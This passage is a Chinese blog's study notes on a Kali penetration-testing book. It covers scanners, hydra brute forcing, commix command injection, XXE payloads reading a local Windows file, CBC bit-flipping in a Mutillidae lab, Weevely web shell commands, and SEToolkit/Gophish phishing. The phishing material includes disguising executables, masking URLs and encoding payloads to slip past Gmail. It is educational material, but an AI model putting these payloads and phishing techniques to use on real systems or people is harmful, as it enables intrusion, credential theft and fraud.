网络服务专用漏洞扫描器</h2><p>漏洞扫描器是自动运行得到应用程序，抓取应用以确定已知漏洞的签名</p><p>Kali附带了几个预安装的漏洞扫描器。渗透测试人员通常会使用两个或三个全面扫描器对同一目标扫描，以确保有效的结果</p><p>常见重要的漏洞扫描器</p><table><thead><tr><th>应用</th><th>描述</th></tr></thead><tbody><tr><td>Arachnid</td><td>开源的Ruby框架，分析扫描接收到的HTTP响应，验证响应并消除误报</td></tr><tr><td>GoLismero</td><td>映射Web应用程序，并且检测常见的漏洞。结果保存为TXT、CVS、HTML和RAW格式</td></tr><tr><td>Nikto</td><td>基于Perl的开源扫描器，允许IDS躲避以及用户改变扫描模块</td></tr><tr><td>Skipfish</td><td>递归抓取和基于字典的抓取以生成目标网站的交互站点网站，并使用附加的漏洞扫描</td></tr><tr><td>Vega</td><td>基于GUI的开源漏洞扫描器</td></tr><tr><td>w3af</td><td>映射目标网站，扫描漏洞</td></tr><tr><td>Wapiti</td><td>基于Python的开源漏洞扫描器</td></tr><tr><td>Webscarab</td><td>OWASP的基于Java框架，用于分析HTTP和HTTPS协议，可作为拦截代理、模糊器和简单的漏洞扫描器</td></tr><tr><td>Webshag</td><td>基于Python的网页爬虫和扫描器，可以利用复杂的IDS躲避</td></tr><tr><td>WebSploit</td><td>用于无线和蓝牙攻击的一个高级中间人框架</td></tr></tbody></table><h1 id="5-针对特定应用的攻击"><a href="#5-针对特定应用的攻击" class="headerlink" title="5. 针对特定应用的攻击"></a>5. 针对特定应用的攻击</h1><h2 id="5-1-暴力破解访问证书"><a href="#5-1-暴力破解访问证书" class="headerlink" title="5.1 暴力破解访问证书"></a>5.1 暴力破解访问证书</h2><p>对网站或其服务最常见的初始攻击之一是针对访问认证的暴力破解攻击，猜测用户名和密码</p><p>Kali配置了hydra（一个命令行工具）和hydra-gtk（它有一个GUI界面）</p><p>这两种工具允许测试用户密码，并支持多种通信协议包括FTP、FTPS、HTTP、HTTPS、ICQ、IRC、LDAP、MySQL、Oracle、POP3、pcAnywhere、SNMP、SSH、VNC等</p><h2 id="5-2-注入"><a href="#5-2-注入" class="headerlink" title="5.2 注入"></a>5.2 注入</h2><p>本节介绍常见的注入攻击</p><ol><li><p>使用commix的OS命令行注入</p><p> 命令行注入开发（commix）是一种用Python编写的自动化工具，在Kali Linux中预编译，如果应用能够被命令注入，则它可以执行各种OS命令。它允许攻击者在应用的特定漏洞部分，甚至在HTTP头中进行注入</p><p> 当对目标URL运行commix工具时，渗透测试人员能够看到在目标服务器上执行命令的进度，以及漏洞的参数。target_host是使用经典注入技术注入的漏洞</p><p> <img src="https://res.weread.qq.com/wrepub/epub_33211566_322" alt="commix注入-1"></p><p> 一旦注入成功，攻击者就可以在服务器上运行命令，例如dir，列出所有的文件和文件夹</p><p> <img src="https://res.weread.qq.com/wrepub/epub_33211566_323" alt="commix示例-2"></p></li><li><p>SQL注入</p><p> <del>重复内容略过</del></p></li><li><p>XML注入</p><p> 大量的Web应用使用了可扩展标记语言（ExtensibleMarkup Language，XML），其定义了一系列编码规则，使得人和机器都容易理解。XML注入利用XML应用或服务的逻辑漏洞，向XML结构或内容中注入攻击信息</p><p> 以下为示例攻击</p><ol><li><p>进入目标页面</p><p> <img src="https://res.weread.qq.com/wrepub/epub_33211566_330"></p></li><li><p>在表格中输入以下命令<code>&lt;!DOCTYPE foo [&lt;!ENTITY Variable &quot;hello&quot;&gt;]&gt;&lt;somexml&gt;&lt;message&gt;&amp;Variable;&lt;/message&gt;&lt;/somexml&gt;</code></p><p> 之后如果返回hello即为成功</p></li><li><p>如果服务器没有响应错误信息，则意味着系统可能存在XML注入漏洞</p></li><li><p>创建一个负载，将SYSTEM加入变量，并调用一个本地文件<code>&lt;!DOCTYPE foo [&lt;!ENTITY Variable &quot;file:///c:/windows/win.ini&quot;&gt;]&gt;&lt;somexml&gt;&lt;message&gt;&amp;Variable;&lt;/message&gt;&lt;/somexml&gt;</code>即可查看文件内容，攻击者可能通过获取整个系统的直接访问权限来进行PowerShell攻击</p></li></ol></li><li><p>位翻转攻击</p><p> 利用密码分块链（Cipher Block Chain，CBC）模式加密给定的明文</p><p> 在CBC模式中，在加密一个分块前，通过创建一个分块逻辑链，明文会与上一个分组的加密输出结果进行异或（XOR）</p><p> <img src="https://res.weread.qq.com/wrepub/epub_33211566_335" alt="CBC模式"></p><p> 这里潜在的攻击场景是第一个分块的异或输入是初始向量。</p><p> 访问mutillidae导航到OWASP2017&gt;A1-Injection(Other)&gt;CBC bit flipping：</p><p> <img src="https://res.weread.qq.com/wrepub/epub_33211566_337" alt="CBC示例"></p><p> 当前运行应用的用户的用户ID和组ID分别都是100。需要做的是成为组000中的用户000以变为高权限的root用户</p><p> 我们唯一要做的就是修改初始向量值6bc24fc1ab650b25b4114e93a98f1eba。这是一个32个字符长度的十六进制数，即二进制长度为128位。然后，我们开始评估初始向量，通过依次访问将值分为两个字符一个分块，并改变URL中的值</p><p> <a href="http://192.168.0.101/mutillidae/index.php?page=view-user-privilege-level.php&amp;iv=00c24fc1ab650b25b4114e93a98f1eba:%E4%B8%8D%E6%94%B9%E5%8F%98%E7%94%A8%E6%88%B7%E5%92%8C%E7%BB%84%E7%9A%84ID">http://192.168.0.101/mutillidae/index.php?page=view-user-privilege-level.php&amp;iv=00c24fc1ab650b25b4114e93a98f1eba:不改变用户和组的ID</a></p><p> <a href="http://192.168.0.101/mutillidae/index.php?page=view-user-privilege-level.php&amp;iv=6b004fc1ab650b25b4114e93a98f1eba:%E4%B8%8D%E6%94%B9%E5%8F%98%E7%94%A8%E6%88%B7%E5%92%8C%E7%BB%84%E7%9A%84ID">http://192.168.0.101/mutillidae/index.php?page=view-user-privilege-level.php&amp;iv=6b004fc1ab650b25b4114e93a98f1eba:不改变用户和组的ID</a></p><p> 在第5个分组6bc24fc100650b25b4114e93a98f1eba时，用户的ID发生了改变</p><p> 尝试修改将异或的值尝试到000</p><p> 为了变成root用户，用户ID和组ID都需要为000，所以我们在所有分块重复上面的过程，直到值发生改变。最后，在第8个分块6bc24fc1ab650b14b4114e93a98f1eba时，组ID发生了改变。然后进行类似于用户ID的处理</p><p> 最后得到了如下结果：6bc24fc1aa650b24b4114e93a98f1eba。如图所示，利用新的值替换初始向量，就可以提升权限访问应用</p><p> <img src="https://res.weread.qq.com/wrepub/epub_33211566_341"></p></li><li><p>使用Web Shell维持访问</p><p> 此处介绍流行的PHP Web Shell小程序Weevely，其他技术可以访问<a href="http://webshell-archive.org/">http://webshell-archive.org/</a></p><p> Weevely模拟一个远程会话，并允许测试人员或攻击者利用30多个模块进行后期开发利用，包括以下优势：</p><ul><li>浏览目标文件系统</li><li>从受感染的系统进行文件传输</li><li>对通用服务器错误配置执行审计</li><li>通过目标系统暴力破解SQL账户</li><li>产生逆向TCP外壳</li><li>在已被侵入的远程系统上执行命令，即使已应用PHP的安全性限制</li></ul><p> Weevely隐藏HTTP cookie中的通信以逃避检测。要创建Weevely，在命令提示符输入以下命令：<code>weevely generate &lt;password&gt; &lt;path&gt;</code></p><p> 这将在对应目录下生成对应密码的php文件</p><p> 连接命令<code>weevely URL/IP &lt;password&gt;</code></p><p> Web Shell也可以用来建立一个反向外壳，连接回测试者，使用netcat或Metasploit框架作为本地监听器。可以通过水平或垂直逐步提升特权来进一步攻击网络内部</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>书籍 Kali高级渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>书籍</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无线攻击</title>
    <link href="/2021/10/05/%E4%B9%A6%E7%B1%8D/Kali%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB/"/>
    <url>/2021/10/05/%E4%B9%A6%E7%B1%8D/Kali%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="无线攻击"><a href="#无线攻击" class="headerlink" title="无线攻击"></a>无线攻击</h1><p>当前移动设备的地位日渐增高，为提供即时网络连接的需要，无线网络已成为互联网上无处不在的接入点。提供便利性的同时也带来了盗窃访问、盗窃数据，以及网络资源拒绝服务等有效攻击</p><p>在本章中，将介绍以下内容：</p><ul><li>配置Kali实现无线攻击</li><li>无线侦察</li><li>绕过隐藏的SSID</li><li>绕过MAC地址认证和开放认证</li><li>破解WAP/WPA2加密和实施中间人攻击</li><li>使用Reaver攻击无线路由</li><li>针对无线通信的拒绝服务(Denial-of-Service,Dos)攻击</li></ul><h1 id="1-为无线攻击配置Kali"><a href="#1-为无线攻击配置Kali" class="headerlink" title="1. 为无线攻击配置Kali"></a>1. 为无线攻击配置Kali</h1><p>在无线安全测试中，最重要的工具是无线适配器。尤其是aircrack-ng工具套件。具体就是，该卡的芯片和驱动器必须具备向通信流注入无线数据包的能力。这是某种攻击的要求，即必须在目标和受害者之间的通信流注入特定类型的数据包。所注入的数据包可能会引起拒绝服务攻击，允许攻击者获取破解加密密钥或支持其他无线攻击所需要的信号交换数据</p><p>aircrack-ng网站（<a href="http://www.aircrack-ng.org)包含一个已知兼容的无线适配器列表/">www.aircrack-ng.org）包含一个已知兼容的无线适配器列表</a></p><p>在Kali中使用最可靠的适配器是Alfa网卡，尤其是AWUS036NH或者WiFi-pineapple适配器，它支持无线802.11b、802.11g和802.11n协议。Alfa网卡已在现有网络中使用，并支持Kali的所有测试和攻击</p><h1 id="2-无线侦察"><a href="#2-无线侦察" class="headerlink" title="2. 无线侦察"></a>2. 无线侦察</h1><p>实施无线攻击的第一步是进行侦探，从而准确识别目标的接入点</p><p>(未完待续<del>之后觉得有必要买网卡之后再看本章</del>)</p>]]></content>
    
    
    <categories>
      
      <category>书籍 Kali高级渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>书籍</tag>
      
      <tag>无线攻击</tag>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>邮箱搭建</title>
    <link href="/2021/10/04/Linux/%E9%82%AE%E7%AE%B1%E6%90%AD%E5%BB%BA/"/>
    <url>/2021/10/04/Linux/%E9%82%AE%E7%AE%B1%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux搭建邮箱系统"><a href="#Linux搭建邮箱系统" class="headerlink" title="Linux搭建邮箱系统"></a>Linux搭建邮箱系统</h1><p>参考<a href="http://blog.leanote.com/post/snowming/a6b66097bccd">博客</a></p><h1 id="1-安装软件"><a href="#1-安装软件" class="headerlink" title="1. 安装软件"></a>1. 安装软件</h1><p>下载sendmail以及采用工具</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 安装postfix、mailx</span><br>apt-get install -y postfix # 设置具体的域名<br>apt-get install -y mailutils <br><span class="hljs-meta">#</span><span class="bash"> 安装vim</span><br>apt-get install -y vim<br><span class="hljs-meta">#</span><span class="bash"> 安装netstat</span><br>apt install net-tools<br></code></pre></div></td></tr></table></figure><h1 id="2-测试"><a href="#2-测试" class="headerlink" title="2. 测试"></a>2. 测试</h1><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 创建测试用户</span><br>useradd -m -s /bin/bash test<br>passwd test<br><span class="hljs-meta">#</span><span class="bash"> 使用telnet连接</span><br>telnet IP Port<br>ehlo 后缀<br>mail from: 发送的邮箱<br>rcpt to:目标邮箱<br>data<br>Subject: Test<br>this is a test<br>.<br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211005134059.png" alt="发送邮件示例"></p><p>查看收到的邮件。转换到具体的用户<code>su - username</code>之后再查看收到的邮件<code>mail</code></p><p>过程中遇到了454 4.7.1 relay access denied问题修改方法是修改文件<code>/etc/postfix/main.cf</code></p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">smtpd_relay_restrictions</span> = permit_mynetworks defer_unauth_destination permit_sasl_authenticated permit_inet_interfaces<br></code></pre></div></td></tr></table></figure><p>我把它改成：</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">smtpd_relay_restrictions</span> = permit_mynetworks permit_sasl_authenticated permit_inet_interfaces defer_unauth_destination<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>高级社会工程学和物理安全 - 2</title>
    <link href="/2021/10/04/%E4%B9%A6%E7%B1%8D/Kali%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%AB%98%E7%BA%A7%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E5%92%8C%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8%20-%202/"/>
    <url>/2021/10/04/%E4%B9%A6%E7%B1%8D/Kali%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%AB%98%E7%BA%A7%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E5%92%8C%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8%20-%202/</url>
    
    <content type="html"><![CDATA[<h1 id="高级社会工程学和物理安全-2"><a href="#高级社会工程学和物理安全-2" class="headerlink" title="高级社会工程学和物理安全 - 2"></a>高级社会工程学和物理安全 - 2</h1><h1 id="5-隐藏可执行文件与伪装攻击者的URL"><a href="#5-隐藏可执行文件与伪装攻击者的URL" class="headerlink" title="5. 隐藏可执行文件与伪装攻击者的URL"></a>5. 隐藏可执行文件与伪装攻击者的URL</h1><p>在之前的示例中，成功的关键因素有两个，首先是获得一些必要的攻击信息，如用户名、商业信息、网络支持细节、系统，以及应用等。第二方面：吸引目标进入一个位置，打开一个可执行文件，或点击一个链接为目的</p><p>如今用户对执行未知的软件变得越来越谨慎小心。然而，有一些方法可以增加成功执行攻击模块的可能性，主要包括以下几点：</p><ul><li>攻击来自受害者信任和已知的系统，或伪装了攻击源地址。如：攻击来自帮助平台或IT支持位置，并声称是一个“紧急软件更新”，软件可能会被执行</li><li>将可执行文件重命名为类似可信的软件。如：”Java更新”</li><li>将恶意的有效负载嵌入良性文件，如利用Metasploit的adobe_pdf_embedded_exe_nojs攻击，嵌入一个PDF文件中</li><li>可执行文件绑定到微软的Office文件、MSI安装文件、或者BAT文件，配置在桌面上默默运行</li><li>有用户点击下载该恶意可执行文件的链接</li><li>由于SEToolkit使用攻击者的URL作为攻击目标，关键成功元素是确保攻击者的URL对受害者是可行的，有以下技术来完成：<ol><li>缩短URL，使用如<a href="https://goo.gl/~~%E5%BD%93%E5%89%8D%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%E4%BA%86~~(%E8%AF%A5%E9%93%BE%E6%8E%A5%E6%8E%A8%E8%8D%90%E4%BA%86https://bitly.com/%E5%92%8Cow.ly)%E6%88%96tinyurl.com%E7%9A%84%E6%9C%8D%E5%8A%A1">https://goo.gl/~~当前无法使用了~~(该链接推荐了https://bitly.com/和ow.ly)或tinyurl.com的服务</a></li><li>在社交媒体网站如Facebook或LinkedIn进入链接。网站会创建自己的链接来代替你的，使用目标页面的镜像</li><li>在LinkedIn或Facebook上创建假网页。作为攻击者，你应控制内容，并能创造一个令人信服的故事，驱使成员点击链接或下载可执行文件</li></ol></li></ul><h1 id="6-使用DNS重定向升级攻击"><a href="#6-使用DNS重定向升级攻击" class="headerlink" title="6. 使用DNS重定向升级攻击"></a>6. 使用DNS重定向升级攻击</h1><p>当已经侵入内部网络的主机，可以使用DNS重定向升级攻击。这被认为是一个横向攻击，当捕获到了特权人员凭据，它也可以垂直升级。在下面的例子中，将使用BetterCap作为交换式区域网的嗅探器、拦截器和记录器。有利于中间人攻击。此处利用其来进行DNS重定向攻击，转移用户到社会工程学攻击的网站</p><p>本章中介绍了Bettercap来进行操作，参考详细的操作<a href="https://blog.csdn.net/whoim_i/article/details/104388168">链接</a></p><p>首先进行安装<code>apt install bettercap</code> 之后的更多操作将在11章进行介绍</p><h2 id="6-1-鱼叉式网络钓鱼攻击"><a href="#6-1-鱼叉式网络钓鱼攻击" class="headerlink" title="6.1 鱼叉式网络钓鱼攻击"></a>6.1 鱼叉式网络钓鱼攻击</h2><p>钓鱼攻击是针对大量受害者的邮件诈骗攻击，例如对已知的email进行群体发送</p><p>注意钓鱼攻击是主要针对人性的攻击，所以应当在邮件中包含人们感兴趣的内容</p><p>鱼叉式网络钓鱼是钓鱼攻击的一种特殊的方式。通过特殊的方法，手工生成邮件消息，攻击者希望吸引特定人群的注意</p><p>攻击流程如下：</p><ol><li><p>首先安装sendmail<code>apt install sendmail</code>，并将配置文件set_config(/etc/setoolkit目录下)中的SENDMAIL=OFF选项修改为ON</p></li><li><p>加载该攻击应从SEToolkit菜单中选择1(SocialEngineering Attacks)子菜单选择1(Spear-PhishingAttack Vectors)</p><p> <img src="https://res.weread.qq.com/wrepub/epub_33211566_229" alt="子菜单"></p></li><li><p>选择1(Perform a Mass Email Attack)后会显示多个攻击负载的列表</p><p> <img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211004194109.png" alt="攻击负载列表"></p></li><li><p>可以根据侦察阶段的可用目标知识来选择任何的可用负载，此处示例使用7(Adobe Flash Player “Button” Remote Code Execution)再选择对应的的有效负载、</p><p> 当SEToolkit控制台准备好了有效负载和漏洞，就会得到如下的确认页面</p><p> <img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211004200930.png" alt="确认页面"></p></li><li><p>此时可用选择重命名2</p></li><li><p>重命名文件后，将获得两个选项：E-mail Attack SingleEmail Address(单个电子邮件攻击)，或者E-mail AttackMass Mailer(攻击大量邮件)</p><p> <img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211004201156.png"></p></li><li><p>攻击者可以选择多个邮件或较弱的受害者单个目标。如果使用单一的电子邮件地址，SEToolkit会提供攻击者可以进一步使用的模板</p></li><li><p>在选择钓鱼模块之后你有两种选择发起攻击：</p><ol><li><p>用你自己的Gmail账户</p></li><li><p>用你自己的服务器或开放中继</p><p> 如果使用Gmail账户，攻击可能失败。Gmail会检查发送的邮件中的恶意文件，能非常有效地识别SEToolkit和Metasploit框架产生的负载。如果你必须使用Gmail发送有效负载，首先用Veil-Evasion编码</p></li></ol></li></ol><p>打开该pdf文件后无法反弹shell</p><h2 id="6-2-使用Gophish设置网络钓鱼活动"><a href="#6-2-使用Gophish设置网络钓鱼活动" class="headerlink" title="6.2  使用Gophish设置网络钓鱼活动"></a>6.2  使用Gophish设置网络钓鱼活动</h2><p>Gophish框架使得任何类型的用户都可以在几分钟内快速创建网络钓鱼，实现复杂的网络钓鱼模拟，或者实施真正的攻击。不同于SEToolkit，Kali Linux中没有预装Gophish框架。本节将介绍如何搭建Gophish环境</p><ol><li><p>首先需要从github上<a href="https://github.com/gophish/gophish/releases">下载</a>对应版本</p></li><li><p>解压并配置config.json文件，如果要在局域网分享资源，这需要在listen_url指定准确的IP地址</p></li><li><p>之后输入<code>./gophish</code>运行应用程序，之后访问对应地址即可</p></li><li><p>界面如下默认用户名admin和密码gophish登录</p><p> <img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211004214400.png" alt="gophish页面"></p></li></ol><h1 id="7-发起网络钓鱼攻击"><a href="#7-发起网络钓鱼攻击" class="headerlink" title="7. 发起网络钓鱼攻击"></a>7. 发起网络钓鱼攻击</h1><p>在发起网络钓鱼攻击前需要注意以下事件：</p><ul><li>模板(Template)：模板是网络钓鱼至关重要的一部分。最常用的模板包括Office365、Webmail,以及内部Facebook和Gmail登录。部分模板可以从以下网站获取：<a href="https://github.com/PacktPublishing/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-Third-Edition/tree/master/Chapter05">https://github.com/PacktPublishing/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-Third-Edition/tree/master/Chapter05</a></li><li>页面(Page)：网络钓鱼攻击效果取决于你如何用引导页将受害者重定向到一个合法网站</li><li>配置信息(Profile)：从配置信息你可以获取到所有的SMTP信息和发送者的信息。Gophish允许攻击者根据定制的电子邮件标题定义多种配置</li><li>用户和群组(User and Group)：上传包含目标受害者姓名的电子邮件账户</li></ul><p>一旦模板、引导页、用户和配置信息都设置好，就可以发起网络钓鱼攻击了。攻击者还可以设计网络钓鱼的时间、次数以及目标受害者的群组。Gophish还提供了可选项，用以测试电子邮件是否成功发送到目标受害者的收件箱</p><p>成功发起钓鱼攻击后，测试者可以监控整个攻击过程的所有细节</p><h1 id="8-利用bulk转换发起网络钓鱼攻击"><a href="#8-利用bulk转换发起网络钓鱼攻击" class="headerlink" title="8. 利用bulk转换发起网络钓鱼攻击"></a>8. 利用bulk转换发起网络钓鱼攻击</h1><p>攻击者也可以利用bulk文件转换软件发起网络钓鱼攻击，如Send、Smash、Hightail、Terashare、WeTransfer、SendSpace和DropSend</p><p>示例场景：</p><p>假设有两名受害者ceo和vijay。攻击者可以在他们之间发送文件，以<a href="mailto:&#99;&#x65;&#111;&#64;&#x63;&#121;&#x62;&#x65;&#x72;&#104;&#x69;&#97;&#46;&#x63;&#111;&#109;">&#99;&#x65;&#111;&#64;&#x63;&#121;&#x62;&#x65;&#x72;&#104;&#x69;&#97;&#46;&#x63;&#111;&#109;</a>为发送者、<a href="mailto:&#x76;&#x69;&#106;&#x61;&#x79;&#64;&#x63;&#x79;&#x62;&#x65;&#114;&#104;&#x69;&#x61;&#x2e;&#x63;&#111;&#109;">&#x76;&#x69;&#106;&#x61;&#x79;&#64;&#x63;&#x79;&#x62;&#x65;&#114;&#104;&#x69;&#x61;&#x2e;&#x63;&#111;&#109;</a>为接收者访问批量传输网站。如图所示，文件上传后，双方都会接收到包含该文件链接的电子邮件，<a href="mailto:&#x63;&#x65;&#111;&#64;&#99;&#x79;&#x62;&#x65;&#114;&#104;&#105;&#x61;&#x2e;&#99;&#111;&#x6d;">&#x63;&#x65;&#111;&#64;&#99;&#x79;&#x62;&#x65;&#114;&#104;&#105;&#x61;&#x2e;&#99;&#111;&#x6d;</a>会接收到文件发送成功的邮件，<a href="mailto:&#118;&#105;&#x6a;&#x61;&#121;&#64;&#x63;&#x79;&#98;&#x65;&#114;&#104;&#105;&#97;&#x2e;&#x63;&#111;&#109;">&#118;&#105;&#x6a;&#x61;&#121;&#64;&#x63;&#x79;&#98;&#x65;&#114;&#104;&#105;&#97;&#x2e;&#x63;&#111;&#109;</a>也会接收到类似邮件。有时，这些批量传输网站不会在公司环境的拦截名单上（如果在，攻击者也可以更换其他网站），从而可以直接接触内部员工，并创建有效的消息，不易察觉的负载也提高了成功概率，并且不会暴露攻击者的身份</p><p><img src="https://res.weread.qq.com/wrepub/epub_33211566_239" alt="示例邮件"></p><h1 id="9-小结"><a href="#9-小结" class="headerlink" title="9. 小结"></a>9. 小结</h1><p>在本章中，研究了如何用社会工程学来促进攻击，用于收获网络凭据、激活恶意软件，或协助发起进一步的攻击。大部分的攻击依赖于社会工程学工具和Gophish。然而，Kali也还有几个其他的应用程序可以使用社会工程学的方法来改进。我们介绍了无须借助任何电子邮件服务，直接利用bulk转换公司就可以发送负载，从而实施网络钓鱼。我们还研究了如何进行物理访问，通常需要与社会工程学相结合，可以用来在目标网络上放置敌意设备</p>]]></content>
    
    
    <categories>
      
      <category>书籍 Kali高级渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali高级渗透测试</tag>
      
      <tag>书籍</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>高级社会工程学和物理安全 - 1</title>
    <link href="/2021/09/28/%E4%B9%A6%E7%B1%8D/Kali%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%AB%98%E7%BA%A7%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E5%92%8C%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8%20-%201/"/>
    <url>/2021/09/28/%E4%B9%A6%E7%B1%8D/Kali%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%AB%98%E7%BA%A7%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E5%92%8C%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8%20-%201/</url>
    
    <content type="html"><![CDATA[<h1 id="高级社会工程学和物理安全-1"><a href="#高级社会工程学和物理安全-1" class="headerlink" title="高级社会工程学和物理安全 - 1"></a>高级社会工程学和物理安全 - 1</h1><p>社会工程学是从人出发提取信息的一门艺术。社会工程学攻击可有效用于欺骗用户从而获取目标系统的物理访问</p><p>社会工程学攻击能够成功的关键因素有以下两个：</p><ul><li>在侦察阶段获取的信息，攻击者必须知道目标的名称和用户名。更重要的是，攻击者要弄清楚目标网络中用户所关注的东西</li><li>弄清楚如何利用这些信息说服潜在目标，通过角色模仿，用电话与他们交谈，向他们发送请求，劝说可能的目标点击某个链接或者执行某个程序，从而进行攻击</li></ul><p>Kali Linux提供了一些工具和框架，在利用社会工程学去影响受害者，使其打开文件或执行某些操作时，这些工具和框架能够增加成功的机会。例如，Metasploit框架生成的基于文件的可执行文件，以及非可执行文件攻击技术（如利用Empire的PowerShell脚本）</p><p>本章中主要介绍社会工程学工具包(Social-Engineering Tooljit, SEToolkit)和Gophish。</p><p>在本章中将介绍：</p><ul><li>攻击者利用的不同社会工程学攻击方法</li><li>在控制台执行物理攻击</li><li>使用微控制器和USB创建流氓物理设备</li><li>使用凭据收割机攻击窃取或者收集用户和密码</li><li>进行标签钓鱼和Web劫持攻击</li><li>使用多种Web混合攻击</li><li>使用PowerShell的字母数字shellcode注入攻击</li><li>在Kali Linux上设置Gophish</li><li>启动电子邮件网络钓鱼攻击</li><li>描述一般的应用实践：<ol><li>隐藏恶意的可执行文件和伪装攻击者的URL</li><li>使用DNS重定向来升级攻击</li><li>通过USB获取系统和网络的访问权限</li></ol></li></ul><h1 id="1-方法论和攻击方法"><a href="#1-方法论和攻击方法" class="headerlink" title="1. 方法论和攻击方法"></a>1. 方法论和攻击方法</h1><p>作为一种支持杀链的攻击途径，社会工程学关注的是攻击的不同方面，具体来说就是利用人的信任关系或者内部人员的帮助，通过欺骗的手段入侵一个网络及其资源。攻击者获取信息的不同攻击方式如图</p><p><img src="https://res.weread.qq.com/wrepub/epub_33211566_199" alt="获取信息的不同攻击方式"></p><p>从此将社会工程学攻击分成两大类：</p><p>基于技术的攻击和基于人的攻击</p><h2 id="1-1-基于技术的攻击"><a href="#1-1-基于技术的攻击" class="headerlink" title="1.1 基于技术的攻击"></a>1.1 基于技术的攻击</h2><p>本章分别探讨在Kali Linux上实施基于计算机的攻击和基于手机的攻击</p><ol><li><p>基于计算机的攻击</p><p> 利用计算机实现社会工程学攻击的方法分为以下类型：</p><ol><li>电子邮箱钓鱼(Email phishing)：攻击者利用电子邮件获取信息，或利用受害者系统中已知软件漏洞的攻击</li><li>引诱(Baiting)：一种用于嵌入已知漏洞并创建后门的技术，通过使用U盘和光盘实现目标。引诱更注重通过物理媒介来利用人类发好奇心。攻击者可以创建一个木马，通过自动运行功能，或当用户单击打开驱动器中的文件时，木马将为他们提供对系统的后门访问</li><li>WiFi钓鱼(WiFi phishing)：渗透测试人员可以通过设置类似于目标企业的假WiFi获取用户名和木马。例如：如果攻击者的目标是XYZ公司，通过将WiFi中的SSID设置为该公司完全相同或相似，允许用户在没有任何秘密的情况下连接到假的无线路由器</li></ol></li><li><p>基于手机的攻击</p><ol><li>短信钓鱼(SMSishing)：攻击者利用短信访问(Short Message Service, SMS)发送链接或者短信诱使目标点击或回复，从而实施钓鱼攻击。渗透测试人员还可以使用公开提供的服务，例如<a href="https://www.spoofmytextmessage.com/free">https://www.spoofmytextmessage.com/free</a></li><li>二维码(Quick Response Code, QR code)：在红队训练中，二维码是将攻击数据发送到孤立的目标区域最有效的方法。与垃圾邮箱类似，可以将二维码打印并粘贴到人流密集的地方</li></ol></li></ol><h2 id="1-2-基于人的攻击"><a href="#1-2-基于人的攻击" class="headerlink" title="1.2 基于人的攻击"></a>1.2 基于人的攻击</h2><p>基于人的攻击是最有效的，针对不同的人性弱点所实施的攻击的不同类型和策略</p><ol><li><p>物理攻击</p><p> 物理攻击通常指涉及攻击者的物理存在所进行的社会工程学攻击。以下是可能执行的两种物理攻击：</p><ol><li>冒充(Impersonation)：这需要测试人员创建一个剧本，模仿一个重要的人物来收集目标公司一组员工的信息。</li><li>控制台上的攻击(Attacks at the 